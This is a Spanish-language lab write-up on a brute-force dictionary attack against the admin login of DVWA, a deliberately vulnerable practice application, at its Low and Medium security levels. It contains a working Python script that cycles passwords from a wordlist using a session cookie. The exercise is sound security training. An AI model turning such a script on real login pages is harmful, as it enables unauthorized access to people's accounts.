# Práctica 01: Brute Force (Fuerza Bruta)

## 📝 Descripción
En esta práctica se explota una vulnerabilidad de autenticación en **DVWA**. El objetivo es descubrir la contraseña del usuario `admin` mediante un ataque de diccionario, probando múltiples combinaciones hasta encontrar la correcta.

## ⚠️ Justificación Metodológica
Inicialmente se planteó el uso de la herramienta **Hydra**. Sin embargo, durante la ejecución en el entorno de laboratorio, se detectaron **errores persistentes de sintaxis y compatibilidad** relacionados con la gestión de cookies de sesión y el formato de los parámetros HTTP en la versión instalada.

Para garantizar la reproducibilidad y el éxito del ataque, se decidió **adaptar el script de Python** (originalmente diseñado para el nivel de dificultad *High*) para resolver también los niveles **Low** y **Medium**. Esta aproximación programática nos permite:
1.  Tener control total sobre las cabeceras HTTP y la cookie `PHPSESSID`.
2.  Evitar los falsos positivos/negativos que estaba generando la herramienta automática.
3.  Gestionar los retardos de tiempo del servidor de forma nativa sin errores de conexión.

---

## 📂 Archivos de la Práctica
La estructura de archivos utilizada para esta práctica es la siguiente:

* `brute_low.py`: Script de ataque configurado para el nivel de seguridad bajo.
* `brute_medium.py`: Script de ataque configurado para el nivel de seguridad medio.
* `diccionario.txt`: Archivo de texto con las contraseñas a probar.
* `../asset/`: Carpeta donde se almacenan las evidencias gráficas.

---

## 🟢 Nivel: LOW

En este nivel, la aplicación no implementa ninguna medida de seguridad contra la fuerza bruta (ni CAPTCHA, ni bloqueo, ni retardos).

### Script (`brute_low.py`)
El siguiente código muestra la lógica utilizada. *Nota: Los datos sensibles como IP o Cookies han sido sustituidos por marcadores genéricos para esta documentación, aunque en la ejecución real se usaron los datos activos de la sesión.*

```python
import requests

# --- CONFIGURACIÓN DEL ENTORNO ---
target_ip = "<IP_DEL_SERVIDOR>"
# Cookie de sesión activa (Extraída con F12 -> Storage)
session_id = "<PEGAR_AQUI_PHPSESSID>" 

# Nivel de seguridad objetivo
security_level = "low" 
# ---------------------------------

url = f"http://{target_ip}:9090/vulnerabilities/brute/"
cookies = {'PHPSESSID': session_id, 'security': security_level}

print(f"[*] Iniciando ataque en nivel: {security_level.upper()}...")

# Carga del diccionario
try:
    with open("diccionario.txt", "r") as f:
        passwords = f.read().splitlines()
except FileNotFoundError:
    print("Error: No se encuentra diccionario.txt")
    exit()

for password in passwords:
    # Parámetros requeridos por el formulario de DVWA
    params = {'username': 'admin', 'password': password, 'Login': 'Login'}
    
    try:
        r = requests.get(url, params=params, cookies=cookies)
        
        # Si la respuesta contiene "Welcome", hemos entrado
        if "Welcome" in r.text:
            print(f"\n[!!!] ÉXITO: Contraseña encontrada -> {password}")
            break
        else:
            print(f"[-] Fallo con: {password}")
            
    except Exception as e:
        print(f"Error de conexión: {e}")
```

### Evidencia
![Brute Force Low](../asset/01_brute_force_low.png)

---

## 🟠 Nivel: MEDIUM

En el nivel medio, la aplicación introduce una medida de seguridad pasiva: un **retardo (sleep) de 2 segundos** cada vez que se introduce una contraseña incorrecta. Esto ralentiza el ataque considerablemente, pero no lo detiene.

Nuestro script en Python maneja este comportamiento automáticamente, esperando la respuesta del servidor antes de lanzar el siguiente intento, lo que lo hace más efectivo que Hydra en este contexto.

### Script (`brute_medium.py`)
La configuración cambia únicamente en la cookie de seguridad para indicar al servidor el nuevo nivel:

```python
# ... (El resto del código es idéntico al anterior)

# Configuración para nivel medio
security_level = "medium" 

# ...
```

### Evidencia
Como se observa en la ejecución, el ataque es exitoso a pesar del retardo introducido por el servidor.

![Brute Force Medium](../asset/01_brute_force_medium.png)
